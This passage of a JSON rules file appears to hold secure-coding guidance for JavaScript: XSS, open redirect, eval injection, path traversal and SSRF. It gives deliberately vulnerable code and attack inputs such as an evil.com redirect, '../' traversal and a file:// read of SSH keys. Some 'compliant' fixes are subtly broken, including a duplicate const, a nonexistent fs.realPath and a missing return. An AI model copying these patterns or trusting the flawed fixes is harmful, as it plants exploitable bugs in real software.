unsanitized URL parameters to alter the DOM of its webpage.</p>\n<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s\nbrowser through this example.</p>\n<h4>Noncompliant code example</h4>\n<p>The <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML\"><code>Element.innerHTML</code></a> property is used to replace the\ncontents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing\nfor code injection.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst rootEl = document.getElementById('root');\nconst queryParams = new URLSearchParams(document.location.search);\nconst input = queryParams.get(\"input\");\n\nrootEl.innerHTML = input; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>The <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText\"><code>HTMLElement.innerText</code></a> property does not\ncreate DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>\ndepending on the use case.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst rootEl = document.getElementById('root');\nconst queryParams = new URLSearchParams(document.location.search);\nconst input = queryParams.get(\"input\");\n\nrootEl.innerText = input;\n</pre>\n<h3>How does this work?</h3>\n<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,\nas there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as\n<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape\nvariables used in views, making it much harder to accidentally write vulnerable code.</p>\n<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>\n<h4>Sanitization of user-supplied data</h4>\n<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data\nintact from the end user’s point of view but make it uninterpretable by web browsers.</p>\n<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context\nwhere malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the\ncontext. <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\">OWASP’s DOM-based XSS Prevention Cheat\nSheet</a> goes into more detail about the required sanitization.</p>\n<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify library</a>\noffers extensive functionality to prevent XSS and has been tested by a large user base.</p>\n<h3>Pitfalls</h3>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is\nsometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the\nfilters of these firewalls.</p>\n<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list\nof sensitive HTML tags is very difficult in the long run.</p>\n<h4>Modification after sanitization</h4>\n<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the\neffects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy</h4>\n<p>With a defense-in-depth security approach, a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">Content Security Policy</a> (CSP) can\nbe added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS\nattacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>\n<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of\nthese domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> <a href=\"http://www.webappsec.org/projects/articles/071105.shtml\">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind\n  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.sonarsource.com/blog/ghost-admin-takeover/\">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S6105": {
        "name": "DOM updates should not lead to open redirect vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com/redirect?url=evil.com</code>, to redirect the victim to their evil domain.</p>\n<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use\nopen redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,\nthe attacker can perform various attacks, such as phishing.</p>\n<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Phishing</h4>\n<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect\nvulnerability to lead the user to this malicious site.</p>\n<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a\nmalicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s\naccount on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of\nthe redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can\nlead to a complete system compromise for the user.</p>\n<h4>JavaScript injection (XSS)</h4>\n<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the\ntrusted domain and has consequences such as the compromise of the user’s account.</p>\n<h2>How to fix it in DOM API</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<p>The following example is vulnerable to open redirection through the following URL:\n<code>https://example.com/redirect?url=https://evil.com</code>;</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst queryParams = new URLSearchParams(document.location.search);\nconst redirectUrl = queryParams.get(\"url\");\ndocument.location = redirectUrl; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst queryParams = new URLSearchParams(document.location.search);\nconst redirectUrl = queryParams.get(\"url\");\n\nif (redirectUrl.startsWith(\"https://www.example.com/\")) {\n    document.location = redirectUrl;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred\nas they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,\nthey might not solve the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li>\n  <li> Using an allowlist approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual\n  redirection. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of <code>String.startsWith</code> and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>\n<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by\nthem.</p>\n<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If\nthe prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the\nbroken validation.</p>\n<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called <a\nhref=\"https://en.wikipedia.org/wiki/Cybersquatting\">cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    let operation = req.query.operation\n    eval(`product_${operation}()`) // Noncompliant\n    res.send(\"OK\")\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst allowed = [\"add\", \"remove\", \"update\"]\n\nlet operationId = req.query.operationId\nconst operation = allowed[operationId]\neval(`product_${operation}()`)\nres.send(\"OK\")\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<p>The example compliant code uses such a binding approach.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nconst path = require('path');\nconst fs   = require('fs');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources/\";\n  const userFilename = path.join(targetDirectory, req.query.filename);\n\n  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' }); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst path = require('path');\nconst fs   = require('fs');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources/\";\n  const userFilename = path.join(targetDirectory, req.query.filename);\n  const userFilename = fs.realPath(userFilename);\n\n  if (!userFilename.startsWith(targetDirectory)) {\n    res.status(401).send();\n  }\n\n  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' });\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>`fs.realPath`</code>. This will resolve relative path or path components\n  like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nconst path = require('path');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources\"\n  const userFilename = path.join(targetDirectory, req.query.filename));\n  const userFilename = fs.realPath(userFilename);\n\n  if (!userFilename.startsWith(targetDirectory)) {\n    res.status(401).send();\n  }\n\n  let data = fs.readFileSync(userFilename);\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<h4>Do not use path.resolve as a validator</h4>\n<p>The <a href=\"https://nodejs.org/api/path.html#pathresolvepaths\">official documentation</a> states that if any argument other than the first is an\nabsolute path, any previous argument is discarded.</p>\n<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5131": {
        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For\nexample, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    json = JSON.stringify({ \"data\": req.query.input });\n    res.send(json);\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfunction (req, res) {\n    res.json({ \"data\": req.query.input });\n};\n</pre>\n<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an\n<code>HttpResponse</code> object.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    res.send(req.query.input);\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfunction (req, res) {\n    res.set('Content-Type', 'text/plain');\n    res.send(req.query.input);\n};\n</pre>\n<h3>How does this work?</h3>\n<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href=\"https://ejs.co/\">ejs</a> to generate\nit. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk\nof cross-site scripting vulnerabilities.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the\n<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and\ninterpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>\n<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse\nand execute the response.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> <a href=\"https://expressjs.com/en/api.html\">Express, 4.x API</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst axios = require('axios');\nconst express = require('express');\n\nconst app = express();\n\napp.get('/example', async (req, res) =&gt; {\n    try {\n        await axios.get(req.query.url); // Noncompliant\n        res.send(\"OK\");\n    } catch (err) {\n        console.error(err);\n        res.send(\"ERROR\");\n    }\n})\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst axios = require('axios');\nconst express = require('express');\n\nconst schemesList = [\"http:\", \"https:\"];\nconst domainsList = [\"trusted1.example.com\", \"trusted2.example.com\"];\n\napp.get('/example', async (req, res) =&gt; {\n    const url = (new URL(req.query.url));\n\n    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {\n        try {\n            await axios.get(url);\n            res.send(\"OK\");\n        } catch (err) {\n            console.error(err);\n            res.send(\"ERROR\");\n        }\n    }else {\n        res.send(\"INVALID_URL\");\n    }\n})\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability 